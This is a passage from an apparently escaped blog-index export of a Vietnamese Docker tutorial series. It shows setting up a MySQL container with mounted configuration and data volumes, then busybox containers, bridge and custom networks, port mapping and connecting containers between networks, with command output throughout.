\u0026#39;ServerName\u0026#39; directive globally to suppress this message [Thu Jun 10 08:10:54.771929 2021] [mpm_event:notice] [pid 1:tid 139955972379776] AH00489: Apache/2.4.48 (Unix) configured -- resuming normal operations [Thu Jun 10 08:10:54.772004 2021] [core:notice] [pid 1:tid 139955972379776] AH00094: Command line: \u0026#39;httpd -D FOREGROUND\u0026#39; Kiểm tra apache Như vậy ở bước trên máy chủ apache của chúng ta đã chạy. Để kiểm tra, ta tiến hành mở trình duyệt 127.0.0.1:9999 hoặc localhost:9999\nNhư vậy, máy chủ apache đã hoạt động hiệu quả. Chúng ta gọi file php để xem proxy có hoạt động không\nNhư vậy, proxy đã gọi được test.php.\nCài đặt, chạy MySQL bằng Docker Trong 2 phần trước, chúng ta đã tạo được 2 container, một container chạy php và một container chạy server apache httpd. Phần này chúng ta sẽ tiến hành cài đặt và chạy MySQL bằng Docker.\nThiết lập biến môi trường cho container Docker cho phép chúng ta thiết lập các biến môi trường cho container thông qua tùy chọn -e. Ví dụ, ta chạy một container từ image busybox, trong đó, thiết lập các biến môi trường cho container:\n1 2 3 4 5 6 ❯ docker run -it --rm -e BIEN1=VALUE1 -e BIEN2=\u0026#34;VALUE2\u0026#34; busybox / # echo $BIEN1 VALUE1 / # echo $BIEN2 VALUE2 / # Đây là cách thức nhiều image đóng gói và thiết lập biến môi trường giúp chúng ta thiết lập các container khi chạy.\nTải về phiên bản mysql Chúng ta tải phiên bản mới nhât của mysql bằng lệnh docker pull\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ❯ docker pull mysql Using default tag: latest latest: Pulling from library/mysql 69692152171a: Already exists 1651b0be3df3: Pull complete 951da7386bc8: Pull complete 0f86c95aa242: Pull complete 37ba2d8bd4fe: Pull complete 6d278bb05e94: Pull complete 497efbd93a3e: Pull complete f7fddf10c2c2: Pull complete 16415d159dfb: Pull complete 0e530ffc6b73: Pull complete b0a4a1a77178: Pull complete cd90f92aa9ef: Pull complete Digest: sha256:d50098d7fcb25b1fcb24e2d3247cae3fc55815d64fec640dc395840f8fa80969 Status: Downloaded newer image for mysql:latest ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 2 days ago 170MB busybox latest 69593048aa3a 2 days ago 1.24MB httpd latest 39c2d1c93266 2 weeks ago 138MB php 7.3-fpm 2692864592ed 4 weeks ago 399MB mysql latest c0cdc95609f1 4 weeks ago 556MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Một số thông tin chính cần chú ý trước khi bắt đầu làm việc với mysql:\nport: 3384 MYSQL 8.0 có thể có một số máy cũ không hỗ trợ, có thể cần cấu hình để hệ thống cũ có thể login vào mysql này. khi đó ta thêm vào file config nội dung sau: [mysqld]\rdefault-authentication-plugin=mysql_native_password file config: /etc/mysql/my.cnf của container Biến môi trường: Tài khoản root:MYSQL_ROOT_PASSWORD database: /var/lib/mysql Lấy file cấu hình my.cnf Chúng ta chạy file mysql và trích xuất file my.cnf ra.\n1 2 3 ❯ docker run --rm -v /home/edisc/Desktop/docker/data:/home/SharedData mysql cp /etc/mysql/my.cnf /home/SharedData/ ❯ ls c1.txt data_container2.txt d.txt httpd.conf my.cnf www Cấu hình file my.cnf Ta thêm dòng lệnh 1 default-authentication-plugin=mysql_native_password vào cuối file my.cnf\nTạo thêm thư mục db trong folder /home/edisc/Desktop/docker/data để lưu trữ dữ liệu, đồng thời khi xóa container đi thì csdl của nó cũng không bị mất đi. Tạo container mysql Chúng ta tạo docker để chạy mysql, trong đó:\nThiết lập biến môi trường để lưu mật khẩu cho tài khoản root, mật khẩu ta chọn là docker123:\n-e MYSQL_ROOT_PASSWORD=docker123, Ánh xạ file cấu hình my.cnf lên thực mục cấu hình trên container:\n-v /home/edisc/Desktop/docker/data/my.cnf:/etc/mysql/my.cnf, Ánh xạ thư mục db trên host lên thư mục lưu trữ databse mặc định của container:\n-v /home/edisc/Desktop/docker/data/db:/var/lib/mysql Tên là c-mysql: --name c-mysql 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ❯ docker run -e MYSQL_ROOT_PASSWORD=docker123 -v /home/edisc/Desktop/docker/data/my.cnf:/etc/mysql/my.cnf -v /home/edisc/Desktop/docker/data/db:/var/lib/mysql --name c-mysql mysql 2021-06-10 09:02:24+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.25-1debian10 started. 2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Switching to dedicated user \u0026#39;mysql\u0026#39; 2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.25-1debian10 started. 2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Initializing database files 2021-06-10T09:02:25.233559Z 0 [System] [MY-013169] [Server] /usr/sbin/mysqld (mysqld 8.0.25) initializing of server in progress as process 43 2021-06-10T09:02:25.244471Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started. 2021-06-10T09:02:26.680645Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended. 2021-06-10T09:02:29.942913Z 6 [Warning] [MY-010453] [Server] root@localhost is created with an empty password ! Please consider switching off the --initialize-insecure option. 2021-06-10 09:02:38+00:00 [Note] [Entrypoint]: Database files initialized 2021-06-10 09:02:38+00:00 [Note] [Entrypoint]: Starting temporary server 2021-06-10T09:02:39.196368Z 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.25) starting as process 88 2021-06-10T09:02:39.243106Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started. 2021-06-10T09:02:39.910377Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended. 2021-06-10T09:02:40.126089Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Socket: /var/run/mysqld/mysqlx.sock 2021-06-10T09:02:40.376702Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed. 2021-06-10T09:02:40.377098Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel. ... Chúng ta không thiết lập tham số ánh xạ cổng vì ở đây chưa có nhu cầu truy cập từ bên ngoài vào csdl c-mysql mà csdl này chỉ để cho c-php và c-httpd truy cập thông qua cổng 3306. Trong thực tế, chúng ta muốn truy cập từ xa, để các server kết nối với nhau, ta cần ánh xạ cổng 3306 này tới máy host.\nThi hành một số lệnh trong container c-mysql Đến đây, chúng ta đã thiết lập được một container chạy mysql, tiếp theo chúng ta vào container trên để chạy một số câu lệnh để kiểm tra.\nVào container c-mysql Đầu tiên, vào container c-mysql bằng lệnh docker exec:\n1 2 3 4 5 6 7 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 10c415b14dbe mysql \u0026#34;docker-entrypoint.s…\u0026#34; 5 minutes ago Up 5 minutes 3306/tcp, 33060/tcp c-mysql 7e8910d1b55c php:7.3-fpm \u0026#34;docker-php-entrypoi…\u0026#34; 43 minutes ago Up 43 minutes 9000/tcp c-php a9d05fe2fc94 httpd \u0026#34;httpd-foreground\u0026#34; About an hour ago Up 34 minutes 0.0.0.0:443-\u0026gt;443/tcp, 0.0.0.0:9999-\u0026gt;80/tcp c-httpd ❯ docker exec -it c-mysql bash root@10c415b14dbe:/# Kết nối với mysql mysql của chúng ta có username là root và có password là docker123 (thiết lập ở trên). Tham số -pdocker123 giúp chúng ta không cần phải nhập lại password.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 root@10c415b14dbe:/# mysql -u root -pdocker123 mysql: [Warning] Using a password on the command line interface can be insecure. Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 8 Server version: 8.0.25 MySQL Community Server - GPL Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; Như vậy chúng ta đã kết nối được mysql và vào bên trong của sql-server.\nKiểm tra có những database nào trong mysql 1 2 3 4 5 6 7 8 9 10 11 mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 4 rows in set (0.00 sec) mysql\u0026gt; Sử dụng database mysql 1 2 3 4 5 6 mysql\u0026gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; Show table 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 mysql\u0026gt; show tables; +------------------------------------------------------+ | Tables_in_mysql | +------------------------------------------------------+ | columns_priv | | component | | db | | default_roles | | engine_cost | | func | | general_log | | global_grants | | gtid_executed | | help_category | | help_keyword | | help_relation | | help_topic | | innodb_index_stats | | innodb_table_stats | | password_history | | plugin | | procs_priv | | proxies_priv | | replication_asynchronous_connection_failover | | replication_asynchronous_connection_failover_managed | | role_edges | | server_cost | | servers | | slave_master_info | | slave_relay_log_info | | slave_worker_info | | slow_log | | tables_priv | | time_zone | | time_zone_leap_second | | time_zone_name | | time_zone_transition | | time_zone_transition_type | | user | +------------------------------------------------------+ 35 rows in set (0.00 sec) mysql\u0026gt; Tạo dữ liệu 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 mysql\u0026gt; CREATE USER \u0026#39;testuser\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;testpass\u0026#39;; Query OK, 0 rows affected (0.03 sec) mysql\u0026gt; create database db_test; Query OK, 1 row affected (0.02 sec) mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | db_test | | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; select User from user; +------------------+ | User | +------------------+ | root | | testuser | | mysql.infoschema | | mysql.session | | mysql.sys | | root | +------------------+ 6 rows in set (0.00 sec) Như vậy ta có các user là: root và testuser. Với testuser có password là testpass.\nKết luận Trong bài học này, chúng ta đã học được từ anh XuanThuLabChanel cách cấu hình ra 3 container chạy 3 dịch vụ khác nhau: mysql, php, máy chủ web apache httpd. trong đó máy chủ web truy cập được cổng 9999 trên host. Trong bài tiếp theo, chúng ta sẽ cài đặt wordpress vào hệ thống này.\n","description":"Phần này chúng ta sẽ học về : cài đặt và cấu hình một hệ thống trên docker gồm  3 container chạy 3 dịch vụ khác nhau: mysql, php, máy chủ web apache httpd. trong đó máy chủ web truy cập được cổng 9999 trên host","id":12,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P4)","uri":"https://minhlongmt183.github.io/posts/docker_p4/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rGiới thiệu về Image Busybox Busybox là một image rất nhỏ gọn nhưng chứa rất nhiều công cụ dựa trên nền tảng linux.\nTải image busybox:\n1 2 3 4 5 6 ❯ docker pull busybox Using default tag: latest latest: Pulling from library/busybox b71f96345d44: Pull complete Digest: sha256:930490f97e5b921535c153e0e7110d251134cc4b72bbb8133c6a5065cc68580d Status: Downloaded newer image for busybox:latest Tạo một container chạy image busybox\n1 2 ❯ docker run -it --rm busybox / # Option --rm dùng cho những container muốn chạy một lần, sau khi chạy xong docker sẽ tự động xóa container đó đi.\nContainer của image busybox có rất nhiều lệnh, để liệt kê các lệnh, ta dùng:\n1 2 3 4 5 6 7 / # ls /bin/ -la total 449700 drwxr-xr-x 2 root root 12288 Jun 7 17:34 . drwxr-xr-x 1 root root 4096 Jun 9 16:00 .. -rwxr-xr-x 400 root root 1149184 Jun 7 17:34 [ -rwxr-xr-x 400 root root 1149184 Jun 7 17:34 [[ -rwxr-xr-x 400 root root 1149184 Jun 7 17:34 acpid Giới thiệu mạng, network trong docker, mạng bridge Liệt kê các mạng có trong docker. Kiểm tra trong docker có những mạng nào, ta dùng lệnh:\n1 2 3 4 5 ❯ docker network ls NETWORK ID NAME DRIVER SCOPE e0b165102300 bridge bridge local 0f2ab02aa9f4 host host local 271997adaaa9 none null local Ở đây chúng ta có 3 network được tạo mặc định khi docker tạo, bao gồm: bridge dùng DRIVER bridge, host dùng DRIVE host và none dùng DRIVE null.\nKiểm tra thông tin network Để kiểm tra thông tin về một network cũng như những container nào kết nối vào, ta dùng lệnh:\ndocker network inspect \u0026lt;NAME\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ❯ docker network inspect bridge [ { \u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;e0b1651023003b4e6235e7b45319daa20d80a247d66e0b303eaf5e53fb90f0f8\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-09T20:59:15.89942017+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: {}, \u0026#34;Options\u0026#34;: { \u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;, \u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34; }, \u0026#34;Labels\u0026#34;: {} } ] Ở đây chúng ta chú ý, trường Container rỗng, có nghĩa là không có container nào kết nối vào.\nMạng bridge. Ta tiến hành tạo một container B1 và kiêm tra lại mạng bridge.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 ❯ docker run -it --name B1 busybox / # % ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2f6dd1dda04d busybox \u0026#34;sh\u0026#34; 9 seconds ago Up 8 seconds B1 ❯ docker network inspect bridge [ { \u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;e0b1651023003b4e6235e7b45319daa20d80a247d66e0b303eaf5e53fb90f0f8\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-09T20:59:15.89942017+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;2f6dd1dda04d0ab42434a6cff6f9c7eb42474f81acdf32809486f8fa82be8951\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B1\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;0af6a3739786e89d5161f25edf7bb2a5d900ab580ab53e8f852a197134e010b7\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: { \u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;, \u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34; }, \u0026#34;Labels\u0026#34;: {} } ] Xem lại trường container thì đã thấy có thêm một container có tên là B1 đang chạy. Ngoài ra chúng ta còn có thể kiếm tra container đang dùng mạng nào và được cấp địa chỉ IP bằng bao nhiêu thông qua lệnh docker inspect \u0026lt;container_name\u0026gt;\nTạo ra thêm 1 container tên B2, khi đó container B1, B2 có thể nhìn thấy nhau, chúng ta có thể kiểm tra thông qua lệnh ping.\nTrong image busybox, có sẵn một công cụ để tạo máy chủ web http. Giả sử ta muốn cho container B2 chạy máy chủ web http, chúng ta vào /var/www và chạy lệnh httpd\n1 2 3 4 5 6 7 ❯ docker attach B2 / # cd var/ /var # ls spool www /var # cd www/ /var/www # httpd /var/www # Tạo một file index.html với nội dung là:\n1 web server is running... Từ container B1, ta tiến hành wget tới B2\n1 2 3 4 5 6 7 8 ❯ docker attach B1 / # wget -O - 172.17.0.3 Connecting to 172.17.0.3 (172.17.0.3:80) writing to stdout web server is running... - 100% |********************************| 25 0:00:00 ETA written to stdout / # Với 172.17.0.3 là địa chỉ của container B2, có thể xem bằng lệnh docker network inspect bridge. Rõ ràng, container B1 đã đọc được file index mà B2 trả về với dòng chữ web server is running...\nÁnh xạ cổng mạng trong docker Ánh xạ cổng mạng B2 đang mở cổng 80, máy host của chúng ta đang có địa chỉ là 127.0.0.1, chúng ta muốn từ ngoài mạng truy cập được tới container B2 thì phải ánh xạ cổng 80 của B2 tới một cổng nào đó của host. Trong ví dụ này, chúng ta sẽ thiết lập truy cập đến cổng 80 của B2 thông qua cổng 8888 ip máy host 127.0.0.1.\nĐiều này được làm ở bước tạo container B2, lúc tạo chúng ta sẽ ánh xạ cổng 80 tới cổng 8888 của máy host. Cú pháp như sau:\ndocker run -it --name \u0026lt;name\u0026gt; -p \u0026lt;host_port\u0026gt;:\u0026lt;container_port\u0026gt; image\n1 2 ❯ docker run -it --name B2 -p 8888:80 busybox / # Khi kiểm tra bằng lệnh docker ps ta sẽ thấy container B2 đã ánh xạ cổng 80 lệnh 8888 của máy host ở PORT.\n1 2 3 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES bdd19faad9cf busybox \u0026#34;sh\u0026#34; 8 minutes ago Up 8 minutes 0.0.0.0:8888-\u0026gt;80/tcp B2 Chúng ta sẽ thao tác lại một lần ở docker B2 để chạy httpd và tạo file index.html với nội dung web server is running... trong thư mục /var/www. Sau đó, chúng ta truy cập ở trình duyện chrome từ máy host đến địa chỉ 127.0.0.1:8888\nNhư vậy, ta đã có thể truy cập đến file index.html trong container B2 từ mạng bên ngoài host.\nTạo thêm mạng Trường hợp chúng ta không muốn tất cả các container cùng kết nối vào một mạng bridge, ta có thể tạo thêm nhiều bridge riêng để có thể tách các riêng các container thành các cụm riêng. Để tạo ra một mạng bridge, ta dùng lệnh:\ndocker network create --driver \u0026lt;loai_mang\u0026gt; \u0026lt;ten_mang\u0026gt;\nỞ đây chúng ta muốn tạo thêm mạng bridge nên sau --driver sẽ là bridge\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ❯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 271997adaaa9 none null local ❯ docker network create --driver bridge mynetwork 6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0 ❯ docker network create --driver bridge network1 8f94d7a2e8ff372c3072294dd5260bbea0d0fb2692c2bedc3acad080b07b229c ❯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 6c224f5d1a98 mynetwork bridge local 8f94d7a2e8ff network1 bridge local 271997adaaa9 none null local Chúng ta tiến hành tạo một số container không kết nối mặc định vào network bridge mà sẽ kết nối vào mynetwork của chúng ta.\n1 2 ❯ docker run -it --name B3 --network mynetwork busybox / # Để chỉ định network khi tạo, ta thêm tùy chọn --network và theo sau là tên của network mình muốn kết nối tới. Chúng ta kiểm tra xem B3 có thật sự đã kết nối tới mynetwork chưa.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 ❯ docker network inspect mynetwork [ { \u0026#34;Name\u0026#34;: \u0026#34;mynetwork\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;6c224f5d1a9819ba01d68ed6cd3a15357709d3b8dcf0b1ab0e289d11973f43d0\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T07:59:52.392658153+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.20.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.20.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;d8f6cf60953a1ebd7c1a84a95e5503bc726a5e77df2c939e8072fe6ca7406d65\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:14:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.20.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: {}, \u0026#34;Labels\u0026#34;: {} } ] Rõ ràng ở trường container đã thêm một container là B3 với địa chỉ là 172.20.0.2. Chúng ta tiếp tục tạo thêm một container B4 kết nối với mynetwork và chỉ định cổng 80 của nó ánh xạ tới cổng 9999 trên máy host.\n1 2 3 4 5 6 7 8 ❯ docker run -it --name B4 --network mynetwork -p 9999:80 busybox / # % ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 1b39318c8d5b busybox \u0026#34;sh\u0026#34; About a minute ago Up About a minute 0.0.0.0:9999-\u0026gt;80/tcp B4 a7231f2ebe67 busybox \u0026#34;sh\u0026#34; 5 minutes ago Up 5 minutes B3 bdd19faad9cf busybox \u0026#34;sh\u0026#34; 37 minutes ago Up 37 minutes 0.0.0.0:8888-\u0026gt;80/tcp B2 2f6dd1dda04d busybox \u0026#34;sh\u0026#34; 9 hours ago Up 3 seconds B1 Như vậy, trên máy của chúng ta đang 2 mạng là bridge và mynetwork:\nMạng bridge có 2 container đang kết nối tới là B1 và B2, trong đó B2 đang ánh xạ cổng 80 đến cổng 8888 trên máy host. Mạng mynetwork có 2 container đang kết nối tới là B3 và B4, trong đó B4 đang ánh xạ cổng 80 đến cổng 9999 trên host.\nTa tiến hành chạy web server http trên container B4 và kết nối từ mạng bên ngoài host.\nKhi tạo ra 2 network thì những máy cùng 1 network (B1 với B2 hoặc B3 với B4) có thể thấy được nhau, tuy nhiên ở khác network (B1 với B3,B4 hoặc B2 với B3,B4) thì không thể thấy nhau. Chúng ta có thể kiểm tra điều này thông qua lênh ping, từ B1 đến B2 và B1 đến B3. Dùng lệnh docker network inspect \u0026lt;ten_network\u0026gt; ta biết được ip của B1, B2, B3 lần lượt là 172.17.0.3, 172.17.0.2, 172.20.0.2. Vào B1 và tiến hành ping qua B2, B3: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ❯ docker attach B1 / # ping 172.17.0.2 PING 172.17.0.2 (172.17.0.2): 56 data bytes 64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.268 ms 64 bytes from 172.17.0.2: seq=1 ttl=64 time=0.101 ms 64 bytes from 172.17.0.2: seq=2 ttl=64 time=0.198 ms 64 bytes from 172.17.0.2: seq=3 ttl=64 time=0.162 ms 64 bytes from 172.17.0.2: seq=4 ttl=64 time=0.165 ms 64 bytes from 172.17.0.2: seq=5 ttl=64 time=0.164 ms 64 bytes from 172.17.0.2: seq=6 ttl=64 time=0.139 ms 64 bytes from 172.17.0.2: seq=7 ttl=64 time=0.160 ms 64 bytes from 172.17.0.2: seq=8 ttl=64 time=0.181 ms ^C --- 172.17.0.2 ping statistics --- 9 packets transmitted, 9 packets received, 0% packet loss round-trip min/avg/max = 0.101/0.170/0.268 ms / # ping 172.20.0.2 PING 172.20.0.2 (172.20.0.2): 56 data bytes ^C --- 172.20.0.2 ping statistics --- 25 packets transmitted, 0 packets received, 100% packet loss / # Ánh xạ cổng cho một container đang chạy. Trong ví dụ trên, B3 đang kết nối tới mynetwork, ta muốn cho B3 kết nối thẳng tới network bridge, ta làm như sau:\ndocker network connect \u0026lt;ten_mang_muon_ket_noi\u0026gt; \u0026lt;ten_container\u0026gt;\n1 ❯ docker network connect bridge B3 Kiểm tra mạng bridge để xem B3 đã thực sự kết nối chưa:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 ❯ docker network inspect bridge [ { \u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;286d5161c9f65235af68d99040f31b167b4bf23f9803fa3a2b3bd7de61b7c81c\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-10T06:58:33.069522692+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;2f6dd1dda04d0ab42434a6cff6f9c7eb42474f81acdf32809486f8fa82be8951\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B1\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;5ddc6f87b486401bd0e2cfea3e1c8324300f9045712778f1c321e35349c56cff\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:03\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.3/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;a7231f2ebe678e679ff063d0d8a09613a81db899ffb7e11eb6ba6c202e2e97d7\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B3\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;f1c96c1089fbe206c52832089be7b18321aeea7abff840f5169d3d171fa5ca1d\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:04\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.4/16\u0026#34;, 